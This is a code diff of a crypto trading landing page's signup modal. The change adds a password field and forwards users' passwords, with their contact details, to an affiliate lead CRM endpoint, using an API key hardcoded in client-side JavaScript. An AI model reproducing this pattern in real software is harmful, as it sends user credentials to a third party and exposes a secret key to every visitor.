@@ -217,15 +217,11 @@ digital asset trading platform, online crypto investment tools, crypto trading s
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
    <script src="script.js"></script>
 
-   <!-- ==================== SIGN UP MODAL ==================== -->
+  <!-- ==================== SIGN UP MODAL ==================== -->
 <div class="modal fade" id="signupModal" tabindex="-1" aria-hidden="true">
   <div class="modal-dialog modal-dialog-centered modal-lg">
     <div class="modal-content" style="border-radius: 16px; overflow: hidden;">
-      <!-- Këtu mund të fusësh një nga format që ke (Forma 1 me video është më e mira) -->
       <div class="modal-body p-0">
-        <!-- Mund të kopjosh këtu kodin e plotë të Formës 1 (me videon) -->
-        <!-- Për momentin po të jap një version të thjeshtë por të bukur -->
-        
         <div style="background: linear-gradient(90deg, #E85B77 0%, #F26F64 100%); color: white; padding: 40px 30px; text-align: center;">
           <h3 class="fw-bold mb-2">Sign up now</h3>
           <p class="mb-4">Start now and celebrate your progress tomorrow!</p>
@@ -240,11 +236,11 @@ digital asset trading platform, online crypto investment tools, crypto trading s
               </div>
             </div>
             <input type="email" class="form-control mt-3" placeholder="Email" required>
+            <input type="password" class="form-control mt-3" placeholder="Password" required>
             <input type="tel" class="form-control mt-3" placeholder="Phone" required>
-              <select id="country" name="country" class="form-control mt-3" required>
-    <option value="">Select Country</option>
-   
-  </select>
+            <select id="country" name="country" class="form-control mt-3" required>
+              <option value="">Select Country</option>
+            </select>
             <button type="submit" class="btn btn-dark w-100 mt-4 py-3 fw-bold">
               SIGN UP
             </button>
@@ -362,8 +358,6 @@ digital asset trading platform, online crypto investment tools, crypto trading s
   });
 </script>
 <script>
-// ==================== SEND LEAD TO API ====================
-
 const API_URL = "https://affiliate-aicrm.marketing/leads";   
 const API_KEY = "6179081b-8fa9-4326-b533-51a82210e46e";     
 
@@ -380,25 +374,23 @@ async function sendLeadToCRM(formData) {
                 email: formData.email,
                 first_name: formData.first_name,
                 last_name: formData.last_name,
+                password: formData.password,
                 phone: formData.phone,
-                country: formData.country || "AL",
-                refer: "1",           
-                platform_key: "c40nzyzod"  
+                country: formData.country,
+                refer: 54674,
+                role: 1
             })
         });
 
         const result = await response.json();
 
         if (response.ok && (result.success || result.status === "success")) {
-            console.log("✅ Lead u krijua me sukses:", result);
-            alert("Thank you! Your registration was successful. We will contact you soon.");
-            
-            // Mbyll modalin
+            console.log("✅ Lead was created successfully :", result);
+
             const modalEl = document.getElementById('signupModal');
             const modal = bootstrap.Modal.getInstance(modalEl);
             if (modal) modal.hide();
             
-            // Reset form
             document.getElementById('modalSignupForm').reset();
             
         } else {
@@ -412,8 +404,6 @@ async function sendLeadToCRM(formData) {
     }
 }
 
-// ==================== FORM SUBMISSION ====================
-
 document.addEventListener('DOMContentLoaded', function() {
     
     const signupForm = document.getElementById('modalSignupForm');
@@ -425,7 +415,6 @@ document.addEventListener('DOMContentLoaded', function() {
             const submitBtn = this.querySelector('button[type="submit"]');
             const originalBtnText = submitBtn.innerHTML;
             
-            // Loading state
             submitBtn.disabled = true;
             submitBtn.innerHTML = 'Processing...';
 
@@ -433,12 +422,12 @@ document.addEventListener('DOMContentLoaded', function() {
                 first_name: this.querySelector('input[placeholder="First Name"]').value.trim(),
                 last_name:  this.querySelector('input[placeholder="Last Name"]').value.trim(),
                 email:      this.querySelector('input[placeholder="Email"]').value.trim(),
+                password:   this.querySelector('input[placeholder="Password"]').value.trim(),
                 phone:      this.querySelector('input[placeholder="Phone"]').value.trim(),
                 country:    this.querySelector('#country') ? this.querySelector('#country').value : ""
             };
 
-            // Validim më i mirë
-            if (!formData.first_name || !formData.last_name || !formData.email || !formData.phone) {
+            if (!formData.first_name || !formData.last_name || !formData.email || !formData.password || !formData.phone) {
                 alert("Please fill in all required fields!");
                 submitBtn.disabled = false;
                 submitBtn.innerHTML = originalBtnText;
@@ -452,13 +441,19 @@ document.addEventListener('DOMContentLoaded', function() {
                 return;
             }
 
+            if (formData.password.length < 6) {
+                alert("Password must be at least 6 characters!");
+                submitBtn.disabled = false;
+                submitBtn.innerHTML = originalBtnText;
+                return;
+            }
+
             sendLeadToCRM(formData);
             
-            // Reset button pas 2 sekondash (në rast gabimi)
             setTimeout(() => {
                 submitBtn.disabled = false;
                 submitBtn.innerHTML = originalBtnText;
-            }, 2000);
+            }, 3000);
         });
     }
 });
